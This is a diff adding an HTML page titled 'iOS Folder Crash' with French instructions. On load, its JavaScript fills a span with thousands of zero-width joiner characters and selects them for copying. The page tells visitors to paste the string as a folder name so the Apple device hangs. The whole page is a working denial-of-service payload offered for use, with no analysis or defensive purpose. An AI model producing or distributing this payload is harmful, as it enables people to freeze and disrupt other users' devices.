@@ -1,0 +1,49 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+	<script type="text/javascript">
+		//document.getElementById('emptyFolderNameLink').addEventListener("click", selectEmptyText);
+		//document.getElementById('emptyFolderNameText').setAttribute("contentEditable", true);	
+		
+		function selectEmptyText() {
+			document.getElementById('text').focus();
+			
+			var sel = window.getSelection();
+			sel.removeAllRanges();
+		
+			var emptyText = document.getElementById('text');		
+			range = document.createRange();	
+			range.setStart(emptyText.firstChild, 0);
+			range.setEnd(emptyText.firstChild, document.getElementById('text').innerText.length);
+			sel.addRange(range);
+			
+			document.getElementById('text').click();
+		}
+	  
+		//document.getElementById('emptyFolderNameText').click();
+	</script>
+	<link rel="stylesheet" href="programs/style.css">
+</head>
+<body onload="
+		document.getElementById('emptyFolderNameLink').addEventListener('click', function(){selectEmptyText();});
+		//​​​​​‍
+		for(i=0; i<=500; i++){
+			document.getElementById('text').innerText += '‍‍‍‍‍‍‍‍‍‍';
+		}
+		//alert('loading...');
+		//setTimeout(selectEmptyText, 1000);">
+	<div ID="container">
+		<h1>
+			iOS Folder Crash
+		</h1>
+		<h3>
+			Seulement pour appareils Apple.
+		</h3>
+		<p>Cliquez <a href="#" id="emptyFolderNameLink">ici</a> et copiez le texte selectionné.<br>
+			Créez un dossier et collez le texte comme nom.<br><br>
+			Quand le dossier sera ouvert, l'appareil Apple va buguer et vous ne pourez rien faire d'autre qu'attendre !<br>
+		<span id="text" contenteditable="true" style="font-size:16px;">&nbsp;</span>
+		</p>
+	</div>
+</body>
+</html>
